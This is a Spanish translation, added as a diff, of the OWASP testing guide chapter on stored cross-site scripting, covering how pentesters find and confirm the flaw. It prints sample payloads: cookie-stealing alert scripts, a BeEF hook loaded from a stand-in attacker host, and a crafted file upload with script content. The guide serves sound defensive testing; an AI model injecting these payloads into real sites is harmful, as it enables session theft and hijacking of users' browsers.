@@ -1,0 +1,190 @@
+<h1 id="stored-cross-site-scripting">Cross Site Scripting almacenado</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-INJT-02</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>El <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener">Cross-site Scripting (XSS)</a> almacenado es el tipo más peligroso de Cross Site Scripting. Las aplicaciones web que permiten a los usuarios almacenar datos están potencialmente expuestas a este tipo de ataque. Este capítulo ilustra ejemplos de inyección de cross site scripting almacenado y escenarios de explotación relacionados.</p>
+<p>El XSS almacenado ocurre cuando una aplicación web recopila una entrada de un usuario que podría ser maliciosa y luego la guarda en un almacén de datos para usarla más adelante. La entrada almacenada no se filtra correctamente. Como consecuencia, los datos maliciosos parecerán formar parte del sitio y se ejecutarán en el navegador del usuario con los privilegios de la aplicación web. Dado que esta vulnerabilidad suele implicar al menos dos peticiones a la aplicación, también puede denominarse XSS de segundo orden.</p>
+<p>Esta vulnerabilidad puede utilizarse para realizar diversos ataques basados en el navegador, entre ellos:</p>
+<ul>
+<li>Secuestro del navegador de otro usuario</li>
+<li>Captura de información sensible vista por los usuarios de la aplicación</li>
+<li>Pseudo defacement de la aplicación</li>
+<li>Escaneo de puertos de hosts internos (&quot;internos&quot; en relación con los usuarios de la aplicación web)</li>
+<li>Entrega dirigida de exploits basados en el navegador</li>
+<li>Otras actividades maliciosas</li>
+</ul>
+<p>El XSS almacenado no requiere que la víctima haga clic en un enlace malicioso: la explotación ocurre cuando un usuario visita una página con un XSS almacenado. Las siguientes fases corresponden a un escenario típico de ataque XSS almacenado:</p>
+<ul>
+<li>El atacante almacena código malicioso en la página vulnerable</li>
+<li>La víctima se autentica en la aplicación</li>
+<li>La víctima ve la página vulnerable</li>
+<li>El navegador de la víctima ejecuta el código malicioso</li>
+</ul>
+<p>Este tipo de ataque también puede explotarse con frameworks de explotación de navegadores como <a href="https://beefproject.com" target="_blank" rel="noopener">BeEF</a>. Estos frameworks permiten desarrollar exploits complejos en JavaScript.</p>
+<p>El XSS almacenado es particularmente peligroso en las áreas de la aplicación a las que acceden usuarios con privilegios elevados. Cuando el administrador visita la página vulnerable, su navegador ejecuta automáticamente el ataque. Esto podría exponer información sensible, como los tokens de autorización de sesión.</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar la entrada almacenada que se refleja en el lado del cliente.</li>
+<li>Evaluar la entrada que aceptan y la codificación que se aplica al devolverla (si la hay).</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<h3 id="black-box-testing">Pruebas de caja negra</h3>
+<p>El proceso para identificar vulnerabilidades XSS almacenado es similar al descrito para el <a href="#/4-Web_Application_Security_Testing/07-Injection/01-Reflected_Cross_Site_Scripting">XSS reflejado</a>.</p>
+<h4 id="input-forms">Formularios de entrada</h4>
+<p>El primer paso consiste en identificar todos los puntos donde la entrada del usuario se almacena en el backend y luego la aplicación la muestra. Se pueden encontrar ejemplos típicos de entrada de usuario almacenada en:</p>
+<ul>
+<li>Página de usuario/perfil: la aplicación permite al usuario editar o cambiar los datos del perfil, como nombre, apellido, apodo, avatar, imagen, dirección, etc.</li>
+<li>Carrito de compras: la aplicación permite al usuario guardar artículos en el carrito de compras para revisarlos más tarde</li>
+<li>Administrador de archivos: aplicación que permite la carga de archivos</li>
+<li>Configuración o preferencias de la aplicación: aplicación que permite al usuario establecer preferencias</li>
+<li>Foro o tablón de mensajes: aplicación que permite el intercambio de publicaciones entre usuarios</li>
+<li>Blog: si la aplicación de blog permite a los usuarios enviar comentarios</li>
+<li>Log: si la aplicación almacena en logs parte de la entrada de los usuarios.</li>
+</ul>
+<blockquote>
+<p>Nota: Esto también puede incluir rutas de URL, cookies, cabeceras HTTP y otros tipos menos evidentes de entrada de usuario, así como parámetros GET y POST.</p>
+</blockquote>
+<h4 id="analyze-html-code">Analizar el código HTML</h4>
+<p>La entrada almacenada por la aplicación se usa normalmente en etiquetas HTML, pero también puede encontrarse como parte de contenido JavaScript. En esta etapa es fundamental entender si la entrada se almacena y cómo se posiciona en el contexto de la página. A diferencia del XSS reflejado, el pentester también debe investigar cualquier canal fuera de banda (out-of-band) a través del cual la aplicación reciba y almacene entrada de los usuarios, como el correo electrónico o la integración con aplicaciones externas.</p>
+<blockquote>
+<p>Nota: Se deben probar todas las áreas de la aplicación accesibles para los administradores con el fin de identificar la presencia de datos enviados por los usuarios.</p>
+</blockquote>
+<p><strong>Ejemplo</strong>: correo electrónico almacenado en <code>index2.php</code></p>
+<p><img src="wstg/4-Web_Application_Security_Testing/07-Injection/images/07-stored_input_example.jpg" alt="Ejemplo de entrada almacenada" loading="lazy"><br><em>Figura 4.7.2-1: Ejemplo de entrada almacenada</em></p>
+<p>El código HTML de index2.php donde se encuentra el valor del correo electrónico:</p>
+<pre><code class="language-html">&lt;input class=&quot;inputbox&quot; type=&quot;text&quot; name=&quot;email&quot; size=&quot;40&quot; value=&quot;aaa@aa.com&quot; /&gt;
+</code></pre>
+<p>En este caso, el evaluador necesita encontrar la forma de inyectar código fuera de la etiqueta <code>&lt;input&gt;</code>, como se muestra a continuación:</p>
+<pre><code class="language-html">&lt;input class=&quot;inputbox&quot; type=&quot;text&quot; name=&quot;email&quot; size=&quot;40&quot; value=&quot;aaa@aa.com&quot;&gt; MALICIOUS CODE &lt;!-- /&gt;
+</code></pre>
+<h4 id="stored-xss">XSS almacenado</h4>
+<p>Esto implica probar los controles de validación de entrada y de filtrado de la aplicación. Ejemplos básicos de inyección en este caso:</p>
+<ul>
+<li><code>aaa@aa.com&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</code></li>
+<li><code>aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</code></li>
+</ul>
+<p>Hay que asegurarse de que la entrada se envíe a través de la aplicación. Normalmente esto implica desactivar JavaScript si se han implementado controles de seguridad del lado del cliente o modificar la petición HTTP con un proxy web. También es importante probar la misma inyección tanto con peticiones HTTP GET como POST. La inyección anterior da como resultado una ventana emergente que contiene los valores de las cookies.</p>
+<blockquote>
+<p><img src="wstg/4-Web_Application_Security_Testing/07-Injection/images/07-stored_xss_example.jpg" alt="Ejemplo de XSS almacenado" loading="lazy"><br><em>Figura 4.7.2-2: Ejemplo de entrada almacenada</em></p>
+<p>El código HTML tras la inyección:</p>
+<pre><code class="language-html">&lt;input class=&quot;inputbox&quot; type=&quot;text&quot; name=&quot;email&quot; size=&quot;40&quot; value=&quot;aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p>La entrada se almacena y el navegador ejecuta el payload (carga útil) XSS al recargar la página. Si la aplicación escapa la entrada, los evaluadores deben probar si la aplicación tiene filtros XSS. Por ejemplo, si la cadena &quot;SCRIPT&quot; se reemplaza por un espacio o por un carácter NULL, esto podría ser un indicio de que hay un filtrado XSS en acción. Existen muchas técnicas para evadir los filtros de entrada (véase el capítulo de <a href="#/4-Web_Application_Security_Testing/07-Injection/01-Reflected_Cross_Site_Scripting">XSS reflejado</a>). Se recomienda encarecidamente que los evaluadores consulten <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noopener">XSS Filter Evasion</a> y otras páginas de XSS Cheat, que ofrecen una lista extensa de ataques XSS y de formas de eludir el filtrado. Consúltense las secciones de whitepapers y herramientas para obtener información más detallada.</p>
+</blockquote>
+<h4 id="leverage-stored-xss-with-beef">Aprovechar el XSS almacenado con BeEF</h4>
+<p>El XSS almacenado puede explotarse con frameworks avanzados de explotación de JavaScript como <a href="https://beefproject.com" target="_blank" rel="noopener">BeEF</a>.</p>
+<p>Un escenario típico de explotación con BeEF implica:</p>
+<ul>
+<li>Inyectar un hook de JavaScript que se comunica con el framework de explotación de navegadores del atacante (BeEF)</li>
+<li>Esperar a que el usuario de la aplicación vea la página vulnerable donde se muestra la entrada almacenada</li>
+<li>Controlar el navegador del usuario de la aplicación mediante la consola de BeEF</li>
+</ul>
+<p>El hook de JavaScript puede inyectarse explotando la vulnerabilidad XSS de la aplicación web.</p>
+<p><strong>Ejemplo</strong>: inyección de BeEF en <code>index2.php</code>:</p>
+<pre><code class="language-html">aaa@aa.com&quot;&gt;&lt;script src=https://attackersite/hook.js&gt;&lt;/script&gt;
+</code></pre>
+<p>Cuando el usuario carga la página <code>index2.php</code>, el navegador ejecuta el script <code>hook.js</code>. Entonces es posible acceder a las cookies, a una captura de pantalla del usuario y a su portapapeles, y lanzar ataques XSS complejos.</p>
+<blockquote>
+<p><img src="wstg/4-Web_Application_Security_Testing/07-Injection/images/07-rubybeef.png" alt="Ejemplo de inyección de BeEF" loading="lazy"><br><em>Figura 4.7.2-3: Ejemplo de inyección de BeEF</em></p>
+<p>Este ataque es particularmente eficaz en páginas vulnerables que son vistas por muchos usuarios con distintos privilegios.</p>
+</blockquote>
+<h4 id="file-upload">Carga de archivos</h4>
+<p>Si la aplicación web permite la carga de archivos, es importante comprobar si es posible subir contenido HTML. Por ejemplo, si se permiten archivos HTML o TXT, se puede inyectar un payload XSS en el archivo subido. El pentester también debe verificar si la carga de archivos permite establecer tipos MIME arbitrarios.</p>
+<p>Considérese la siguiente petición HTTP POST para la carga de un archivo:</p>
+<pre><code class="language-http">POST /fileupload.aspx HTTP/1.1
+[…]
+Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;
+Content-Type: text/plain
+
+test
+</code></pre>
+<p>Este fallo de diseño puede explotarse en ataques de manejo incorrecto de MIME por parte del navegador. Por ejemplo, archivos de apariencia inocua, como JPG y GIF, pueden contener un payload XSS que se ejecuta cuando el navegador los carga. Esto es posible cuando el tipo MIME de una imagen, como <code>image/gif</code>, puede establecerse en cambio como <code>text/html</code>. En ese caso, el navegador del cliente tratará el archivo como HTML.</p>
+<p>Petición HTTP POST manipulada:</p>
+<pre><code class="language-html">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
+Content-Type: text/html
+
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p>Hay que tener en cuenta también que los navegadores antiguos, como Internet Explorer, pueden no manejar los tipos MIME de la misma manera que Firefox, Chrome o Edge. Por ejemplo, Internet Explorer trataba como HTML algunos archivos TXT que contenían HTML. Para más información sobre el manejo de MIME, consúltese la sección de whitepapers al final de este capítulo.</p>
+<h3 id="blind-cross-site-scripting">Cross-site Scripting ciego</h3>
+<p>El Cross-site Scripting ciego (blind) es una forma de XSS almacenado. Generalmente ocurre cuando el payload del atacante se guarda en el servidor o la infraestructura y luego la aplicación de backend lo refleja de vuelta a la víctima. Por ejemplo, en formularios de comentarios, un atacante puede enviar el payload malicioso mediante el formulario y, cuando el usuario o administrador del backend de la aplicación ve el envío del atacante a través de la aplicación de backend, el payload del atacante se ejecutará. El Cross-site Scripting ciego es difícil de confirmar en escenarios reales, pero una de las mejores herramientas para ello es <a href="https://xsshunter.com/" target="_blank" rel="noopener">XSS Hunter</a>.</p>
+<blockquote>
+<p>Nota: Los evaluadores deben considerar cuidadosamente las implicaciones de privacidad de usar servicios públicos o de terceros al realizar pruebas de seguridad. (Véase <a href="#/4-Web_Application_Security_Testing/07-Injection/02-Stored_Cross_Site_Scripting@tools">#herramientas</a>.)</p>
+</blockquote>
+<h3 id="gray-box-testing">Pruebas de caja gris</h3>
+<p>Las pruebas de caja gris son similares a las de caja negra. En ellas, el pentester tiene un conocimiento parcial de la aplicación. En este caso, el pentester podría conocer información sobre la entrada del usuario, los controles de validación de entrada y el almacenamiento de datos.</p>
+<p>Según la información disponible, normalmente se recomienda que los evaluadores comprueben cómo procesa la aplicación la entrada del usuario y luego la almacena en el sistema de backend. Se recomiendan los siguientes pasos:</p>
+<ul>
+<li>Usar la aplicación de frontend e introducir entradas con caracteres especiales o no válidos</li>
+<li>Analizar la(s) respuesta(s) de la aplicación</li>
+<li>Identificar la presencia de controles de validación de entrada</li>
+<li>Acceder al sistema de backend y comprobar si la entrada se almacena y cómo se almacena</li>
+<li>Analizar el código fuente y entender cómo la aplicación muestra la entrada almacenada</li>
+</ul>
+<p>Si se dispone del código fuente (como en las pruebas de caja blanca), deben analizarse todas las variables usadas en los formularios de entrada. En particular, lenguajes de programación como PHP, ASP y JSP utilizan variables y funciones predefinidas para almacenar la entrada de las peticiones HTTP GET y POST.</p>
+<p>La siguiente tabla resume algunas variables y funciones especiales que hay que revisar al analizar el código fuente:</p>
+<div class="tabla"><table><thead><tr>
+<th><strong>PHP</strong></th>
+<th><strong>ASP</strong></th>
+<th><strong>JSP</strong></th>
+</tr>
+</thead><tbody><tr>
+<td><code>$_GET</code> - variables HTTP GET</td>
+<td><code>Request.QueryString</code> - HTTP GET</td>
+<td>servlets <code>doGet</code>, <code>doPost</code> - HTTP GET y POST</td>
+</tr>
+<tr>
+<td><code>$_POST</code> - variables HTTP POST</td>
+<td><code>Request.Form</code> - HTTP POST</td>
+<td><code>request.getParameter</code> - variables HTTP GET/POST</td>
+</tr>
+<tr>
+<td><code>$_REQUEST</code> - variables HTTP POST, GET y COOKIE</td>
+<td><code>Server.CreateObject</code> - se usa para cargar archivos</td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_FILES</code> - variables de carga de archivos HTTP</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_SERVER</code> - cabeceras HTTP</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table></div>
+<blockquote>
+<p>Nota: La tabla anterior es solo un resumen de los parámetros más importantes, pero deben investigarse todos los parámetros de entrada del usuario.</p>
+</blockquote>
+<h2 id="tools">Herramientas</h2>
+<ul>
+<li><a href="https://hackvertor.co.uk/" target="_blank" rel="noopener">Hackvertor</a> es una herramienta en línea que permite muchos tipos de codificación y ofuscación de JavaScript (o de cualquier cadena de entrada).</li>
+<li><a href="https://beefproject.com" target="_blank" rel="noopener">BeEF</a> es el browser exploitation framework. Una herramienta profesional para demostrar el impacto en tiempo real de las vulnerabilidades de los navegadores.</li>
+<li><a href="https://portswigger.net/burp/" target="_blank" rel="noopener">Burp Proxy</a> es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web.</li>
+<li><a href="https://www.greasespot.net/" target="_blank" rel="noopener">XSS Assistant</a> es un script de Greasemonkey que permite a los usuarios probar fácilmente cualquier aplicación web en busca de fallos de cross-site scripting.</li>
+<li><a href="https://www.zaproxy.org" target="_blank" rel="noopener">Zed Attack Proxy (ZAP)</a> es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web con un escáner integrado.</li>
+<li><a href="https://github.com/mandatoryprogrammer/xsshunter" target="_blank" rel="noopener">XSS Hunter Portable</a> XSS Hunter encuentra todo tipo de vulnerabilidades de cross-site scripting, incluido el XSS ciego, que a menudo se pasa por alto.</li>
+</ul>
+<h2 id="references">Referencias</h2>
+<h3 id="owasp-resources">Recursos de OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet</a></li>
+</ul>
+<h3 id="books">Libros</h3>
+<ul>
+<li>Joel Scambray, Mike Shema, Caleb Sima - &quot;Hacking Exposed Web Applications&quot;, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li>
+<li>Dafydd Stuttard, Marcus Pinto - &quot;The Web Application&#39;s Handbook - Discovering and Exploiting Security Flaws&quot;, 2008, Wiley, ISBN 978-0-470-17077-9</li>
+<li>Jeremiah Grossman, Robert &quot;RSnake&quot; Hansen, Petko &quot;pdp&quot; D. Petkov, Anton Rager, Seth Fogie - &quot;Cross Site Scripting Attacks: XSS Exploits and Defense&quot;, 2007, Syngress, ISBN-10: 1-59749-154-3</li>
+</ul>
+<h3 id="whitepapers">Whitepapers</h3>
+<ul>
+<li><a href="https://www.sei.cmu.edu/documents/507/2000_019_001_496188.pdf" target="_blank" rel="noopener">CERT: &quot;CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests&quot;</a></li>
+<li><a href="https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf" target="_blank" rel="noopener">Amit Klein: &quot;Cross-site Scripting Explained&quot;</a></li>
+<li><a href="https://www.cgisecurity.com/xss-faq.html" target="_blank" rel="noopener">CGISecurity.com: &quot;The Cross Site Scripting FAQ&quot;</a></li>
+</ul>
